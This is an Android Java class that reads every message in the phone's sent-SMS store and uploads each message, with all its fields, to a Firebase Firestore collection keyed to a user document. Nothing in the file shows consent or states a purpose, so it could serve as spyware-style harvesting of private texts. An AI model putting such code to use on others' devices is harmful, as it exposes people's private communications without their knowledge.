package com.example.myapplication;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.firestore.FirebaseFirestore;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class Sms extends Thread{
    FirebaseFirestore db = FirebaseFirestore.getInstance();
    FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
    String docId ;
    Map<String,Object> msg = new HashMap<>();
    Context context;
    Sms(Context context){
        this.context = context;

    }

    public void run(){
        docId = MainActivity.e;
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                int msgID = 0;
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    if(cursor.getColumnName(idx) == "date"){

                        String date = cursor.getString(idx);
                        SimpleDateFormat formatter = new SimpleDateFormat(
                                "dd-MMM-yyyy HH:mm");
                        String dateString = formatter.format(new Date(Long
                                .parseLong(date)));
                        msg.put(cursor.getColumnName(idx),dateString);

                    }
                    else {
                        msg.put(cursor.getColumnName(idx), cursor.getString(idx));
                    }
                    msgID = cursor.getColumnIndex("_id");
                }

                db.collection("user").document(docId).collection("message").document(cursor.getString(msgID)).set(msg);

            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }
    }
}
